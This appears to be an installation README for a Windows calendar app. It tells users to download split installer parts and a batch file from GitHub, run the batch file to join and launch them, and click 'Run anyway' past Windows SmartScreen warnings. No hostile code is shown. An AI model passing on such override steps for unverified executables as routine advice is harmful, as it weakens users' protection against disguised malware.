# 💻 Install Simple Calendar on Windows

## 1. Delete old downloads (if updating)
Open your **Downloads** folder and delete old Simple Calendar files: `Simple-Calendar-Windows-Installer….part`, `Simple-Calendar-Windows-Installer….exe` and `Install-Simple-Calendar….bat` (including ones with `(1)` in the name).

## 2. Download these 6 files into the same folder
1. [⬇️ Part 1](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v44.exe.00.part)
2. [⬇️ Part 2](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v44.exe.01.part)
3. [⬇️ Part 3](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v44.exe.02.part)
4. [⬇️ Part 4](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v44.exe.03.part)
5. [⬇️ Part 5](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v44.exe.04.part)
6. [⬇️ Install-Simple-Calendar-v44.bat](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Install-Simple-Calendar-v44.bat)

## 3. Double-click Install-Simple-Calendar-v44.bat
It joins the parts into **Simple-Calendar-Windows-Installer-v44.exe** and opens the installer for you.
- If Windows says "Windows protected your PC", click **More info**, then **Run anyway**. You'll see this once for the .bat file and once for the installer.
- Leave **Start at login** ticked so alarms always work.

## ✅ Good to know
- Closing the window keeps the app running in the **tray** (by the clock), so alarms still ring.
- Alarms only ring while your PC is on.

## ⬆️ Updating
The app checks for updates regularly. When a new version is out you get a tray notification and an **Update available** message with what's new. You can also use **Settings (⚙) → Check for updates**, or right-click the tray icon.

Click **Download now**. The app downloads the update, checks it isn't damaged, and runs the installer. No parts or .bat needed. Your events, marks and settings are kept.

On v41 or older, install v44 by hand once using the steps above.

## ❓ Help
- **"Missing file":** the .bat names the part it can't find. Download that part again into the same folder as the .bat.
- **Installer won't open:** the joined file should be about 100 MB. If it isn't, the .bat tells you; download the parts again.
- **No alarm:** check the tray icon is there and Focus / Do not disturb is off.
